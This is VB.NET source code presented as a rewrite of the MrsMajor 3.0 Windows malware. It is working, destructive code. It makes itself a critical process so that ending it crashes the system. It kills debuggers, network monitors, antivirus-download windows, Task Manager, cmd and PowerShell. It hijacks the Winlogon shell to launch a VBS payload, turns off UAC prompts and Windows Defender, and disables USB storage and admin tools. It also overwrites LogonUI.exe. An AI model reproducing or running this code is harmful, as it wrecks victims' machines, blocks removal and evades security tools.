' The original source code made by rootabx is available at: https://github.com/Gork3m/MrsMajor-3.0
' rewritten in VB.NET by Angel Castillo / Windows Vista

Imports System.Collections
Imports System.IO
Imports System.Diagnostics
Imports System.Text
Imports System.Threading
Imports System.Security.Principal
Imports System.Runtime.InteropServices
Imports System.Windows.Forms
Imports Microsoft.Win32

Public Class protection64

    <DllImport("ntdll.dll", SetLastError:=True)>
    Private Shared Function NtSetInformationProcess(hProcess As IntPtr, processInformationClass As Integer, ByRef processInformation As Integer, processInformationLength As Integer) As Integer
    End Function
    Dim isCritical As Integer = 1
    Const breakOnTermination As Integer = &H1D
    Public werekilling As Integer = 1
    Function lower(inp As String) As String
        Return inp.ToLower().Replace("ı", "i")
    End Function
#Region "randomshit"
    Const MAXTITLE As Integer = 255
    Private Shared mTitlesList As ArrayList
    Private Delegate Function EnumDelegate(ByVal hWnd As IntPtr, ByVal lParam As Integer) As Boolean

    <DllImport("user32.dll", EntryPoint:="EnumDesktopWindows", ExactSpelling:=False, CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function _EnumDesktopWindows(ByVal hDesktop As IntPtr, ByVal lpEnumCallbackFunction As EnumDelegate, ByVal lParam As IntPtr) As Boolean
    End Function

    <DllImport("user32.dll", EntryPoint:="GetWindowText", ExactSpelling:=False, CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function _GetWindowText(ByVal hWnd As IntPtr, ByVal lpWindowText As StringBuilder, ByVal nMaxCount As Integer) As Integer
    End Function

    Private Shared Function EnumWindowsProc(ByVal hWnd As IntPtr, ByVal lParam As Integer) As Boolean
        Dim title As String = GetWindowText(hWnd)
        mTitlesList.Add(title)
        Return True
    End Function


    ''' <summary>
    ''' Returns the caption of a windows by given HWND identifier.
    ''' </summary>
    Public Shared Function GetWindowText(ByVal hWnd As IntPtr) As String
        Dim title As StringBuilder = New StringBuilder(MAXTITLE)
        Dim titleLength As Integer = _GetWindowText(hWnd, title, title.Capacity + 1)
        title.Length = titleLength
        Return title.ToString()
    End Function


    ''' <summary>
    ''' Returns the caption of all desktop windows.
    ''' </summary>
    Public Shared Function GetDesktopWindowsCaptions() As String()
        mTitlesList = New ArrayList()
        Dim enumfunc As EnumDelegate = New EnumDelegate(AddressOf EnumWindowsProc)
        Dim hDesktop As IntPtr = IntPtr.Zero ' current desktop
        Dim success As Boolean = _EnumDesktopWindows(hDesktop, enumfunc, IntPtr.Zero)

        If success Then
            ' Copy the result to string array
            Dim titles As String() = New String(mTitlesList.Count - 1) {}
            mTitlesList.CopyTo(titles)
            Return titles
        Else
            ' Get the last Win32 error code
            Dim errorCode As Integer = Marshal.GetLastWin32Error()
            Dim errorMessage As String = String.Format("EnumDesktopWindows failed with code {0}.", errorCode)
            Throw New Exception(errorMessage)
        End If
    End Function

    Private criticalwindlist As String() = {"proxycap", "proxifier", "fiddler", "wireshark", "dnspy", "process hacker", "megadumper", "ollydbg", "softperfect", "httpdebugger", "ilspy", "de4dot", "decompiler", "group policy", "nofuser", "dependency walker", "dotpeek", "process monitor", "resource monitor", "antivirus download", "rootabx", "mrsmajor virus", "disinfect virus", "mrsmajor removal", "eset download", "malwarebytes download", "av download", "kill me senpai", "security policy", "control panel"}
    Private proclist As String() = {"memz.exe", "taskmgr.exe", "regedit.exe", "mrsmjrgui.exe", "cmd.exe", "taskkill.exe", "powershell.exe", "resmon.exe", "mmc.exe", "wscript.exe"}

#End Region
    Public Sub logonuiOWR()
        Try
            File.Copy("C:\windows\winbase_base_procid_none\secureloc0x65\0x000F.wav", "C:\0x000F.wav")
        Catch
        End Try

        Try
            Dim fs As FileStream = File.Create("C:\windows\WinAttr.gci")
            fs.Close()
        Catch
        End Try

        werekilling = 0
        Thread.Sleep(200)

        Try
            Dim prcx As Process = New Process()
            prcx.StartInfo.FileName = "C:\windows\system32\takeown.exe"
            prcx.StartInfo.Arguments = "/f C:\windows\system32\LogonUI.exe"
            prcx.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
            prcx.StartInfo.Verb = "runas"
            prcx.Start()
        Catch
        End Try

        Try
            Dim prcx As Process = New Process()
            prcx.StartInfo.FileName = "C:\windows\system32\icacls.exe"
            prcx.StartInfo.Arguments = "C:\windows\system32\LogonUI.exe /granted """ & Environment.GetEnvironmentVariable("USERNAME") & """:F"
            prcx.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
            prcx.StartInfo.Verb = "runas"
            prcx.Start()
        Catch
        End Try

        Thread.Sleep(1000)

        Try
            File.Copy("C:\windows\winbase_base_procid_none\secureloc0x65\ui65.exe", "C:\windows\system32\LogonUI.exe", True)
        Catch
        End Try

        Dim prc As Process = New Process()
        prc.StartInfo.FileName = "cmd.exe"
        prc.StartInfo.Arguments = "/c cd\&cd Windows\system32&takeown /f LogonUI.exe&icacls LogonUI.exe /granted ""%username%"":F&cd..&cd winbase_base_procid_none&cd secureloc0x65&copy ""ui65.exe"" ""C:\windows\system32\LogonUI.exe"" /Y&echo WinLTDRStartwinpos > ""c:\windows\WinAttr.gci""&timeout 2&taskkill /f /im ""tobi0a0c.exe""&exit"
        prc.StartInfo.Verb = "runas"
        prc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden

        Try
            prc.Start()
        Catch
        End Try

        Thread.Sleep(10000)
        Application.[Exit]()
    End Sub
    Sub taskkill()
        Do
            Dim Procs As Process() = Process.GetProcesses()

            For Each prc As Process In Procs
                Dim desktopWindowsCaptions As String() = GetDesktopWindowsCaptions()

                For Each caption As String In desktopWindowsCaptions

                    If caption.Length > 1 Then

                        If lower(caption).Contains("winbase_base_procid_none") Then

                            If werekilling = 1 Then
                                Application.[Exit]()
                            End If
                        End If
                    End If
                Next
            Next

            Thread.Sleep(100)
        Loop
    End Sub
    Sub regdefend()
        Do

            Try
                Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon")
                reg.SetValue("Shell", "explorer.exe, wscript.exe ""C:\windows\winbase_base_procid_none\secureloc0x65\WinRapistI386.vbs""")
                reg.Dispose()
            Catch
            End Try

            Try
                Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system")
                reg.SetValue("ConsentPromptBehaviorAdmin", 0)
                reg.Dispose()
            Catch
            End Try

            Try
                Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop")
                reg.SetValue("NoChangingWallPaper", 1)
                reg.Dispose()
            Catch
            End Try

            Try
                Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
                reg.SetValue("DisableTaskMgr", 1)
                reg.Dispose()
            Catch
            End Try

            Try
                Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
                reg.SetValue("DisableRegistryTools", 1)
                reg.Dispose()
            Catch
            End Try

            Try
                Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
                reg.SetValue("NoRun", 1)
                reg.Dispose()
            Catch
            End Try

            Try
                Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
                reg.SetValue("NoWinKeys", 1)
                reg.Dispose()
            Catch
            End Try

            Try
                Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\usbstor")
                reg.SetValue("Start", 4)
                reg.Dispose()
            Catch
            End Try

            Try
                Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Policies\Microsoft\Windows Defender")
                reg.SetValue("DisableAntiSpyware", 1)
                reg.Dispose()
            Catch
            End Try

            Try
                Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Control Panel\Cursors")
                reg.SetValue("Arrow", "C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur")
                reg.SetValue("AppStarting", "C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur")
                reg.SetValue("Hand", "C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur")
                reg.Dispose()
            Catch
            End Try
            Thread.Sleep(2000)
        Loop
    End Sub
    Sub selfdefend()
        Do
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, breakOnTermination, isCritical, Marshal.SizeOf(Of Integer))
            Thread.Sleep(5000)
        Loop
    End Sub
    Sub winprockill()
        Do
            Dim Procs As Process() = Process.GetProcesses()
            For Each prc As Process In Procs

                For r As Integer = 0 To criticalwindlist.Length - 1

                    If lower(prc.MainWindowTitle).Contains(criticalwindlist(r)) Then

                        If werekilling = 1 Then
                            werekilling = 0

                            Try
                                Dim prcx As Process = New Process()
                                prcx.StartInfo.FileName = "cmd.exe"
                                prcx.StartInfo.Arguments = "/c taskkill /f /im tobi0a0c.exe"
                                prcx.StartInfo.Verb = "runas"
                                prcx.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                                prcx.Start()
                            Catch
                                Application.[Exit]()
                            End Try

                            Thread.Sleep(4000)
                            werekilling = 1
                        End If
                    End If
                Next

                If lower(prc.MainWindowTitle) Is "charles" AndAlso lower(prc.ProcessName) & ".exe" Is "charles.exe" Then

                    Try

                        If werekilling = 1 Then
                            prc.Kill()
                        End If

                    Catch
                    End Try
                End If

                For r As Integer = 0 To proclist.Length - 1

                    If (lower(prc.ProcessName) & ".exe").Contains(proclist(r)) Then

                        If werekilling = 1 Then

                            Try
                                prc.Kill()
                            Catch
                            End Try
                        End If
                    End If
                Next
            Next
            Thread.Sleep(1)
        Loop
    End Sub
    Sub winprockill2()
        'do nothing and exit
    End Sub
    Public Function userIsAdministrator() As Boolean
        Using identity As WindowsIdentity = WindowsIdentity.GetCurrent()
            Dim rep As Boolean = False
            Try
                Dim principal As WindowsPrincipal = New WindowsPrincipal(identity)
                rep = principal.IsInRole(WindowsBuiltInRole.Administrator)
            Catch
            End Try
            Return rep
        End Using
    End Function

    Private Sub protection64_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Visible = False
        If userIsAdministrator() Then
            werekilling = 1
            Process.EnterDebugMode()
            ThreadPool.QueueUserWorkItem(New WaitCallback(AddressOf selfdefend))
            ThreadPool.QueueUserWorkItem(New WaitCallback(AddressOf winprockill))
            ThreadPool.QueueUserWorkItem(New WaitCallback(AddressOf taskkill))
            ThreadPool.QueueUserWorkItem(New WaitCallback(AddressOf regdefend))
        End If
    End Sub
End Class
